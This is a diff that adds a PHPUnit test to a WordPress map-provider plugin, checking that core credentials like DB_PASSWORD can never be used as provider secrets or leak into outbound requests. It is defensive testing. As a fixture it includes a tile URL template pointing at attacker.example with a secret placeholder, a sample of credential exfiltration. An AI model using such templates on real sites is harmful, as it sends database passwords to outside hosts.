@@ -305,6 +305,31 @@ final class RestApiTest extends SwMapsTestCase {
 		$this->assertSame( 204, $this->rest( 'DELETE', "/providers/{$data['id']}" )->get_status() );
 	}
 
+	public function test_core_credentials_can_never_be_used_as_provider_secrets(): void {
+		$this->as_role( 'administrator' );
+		foreach ( array( 'DB_PASSWORD', 'AUTH_KEY', 'ABSPATH' ) as $constant ) {
+			$response = $this->rest( 'POST', '/providers', array( 'name' => 'Leak', 'secret_constant' => $constant, 'public_config' => array( 'urlTemplate' => 'https://attacker.example/{z}/{x}/{y}?v={secret}', 'attribution' => 'x' ) ) );
+			$this->assertSame( 400, $response->get_status(), $constant );
+		}
+		// A row written before the rule existed is still never resolved by the connection test.
+		global $wpdb;
+		// A public IP literal passes wp_safe_remote_get()'s URL validation without DNS, so the request reaches the filter.
+		$created = $this->rest( 'POST', '/providers', array( 'name' => 'Legacy', 'public_config' => array( 'urlTemplate' => 'https://93.184.216.34/{z}/{x}/{y}?v={secret}', 'attribution' => 'x' ) ) )->get_data();
+		$wpdb->update( SWMaps\WordPress\Persistence\Schema::table( 'providers' ), array( 'secret_constant' => 'DB_PASSWORD' ), array( 'id' => $created['id'] ) );
+		$requested = array();
+		$spy       = static function ( $pre, array $args, string $url ) use ( &$requested ) {
+			unset( $pre, $args );
+			$requested[] = $url;
+			return new WP_Error( 'http_request_failed', 'blocked' );
+		};
+		add_filter( 'pre_http_request', $spy, 10, 3 );
+		$this->rest( 'POST', "/providers/{$created['id']}/test" );
+		remove_filter( 'pre_http_request', $spy, 10 );
+		$this->assertCount( 1, $requested );
+		$this->assertStringNotContainsString( DB_PASSWORD, $requested[0] );
+		$this->assertFalse( $this->rest( 'GET', "/providers/{$created['id']}" )->get_data()['secret_defined'] );
+	}
+
 	public function test_provider_connection_test_reports_success_and_failure(): void {
 		$this->as_role( 'administrator' );
 		$id = Services::instance()->providers()->list()[0]->id;
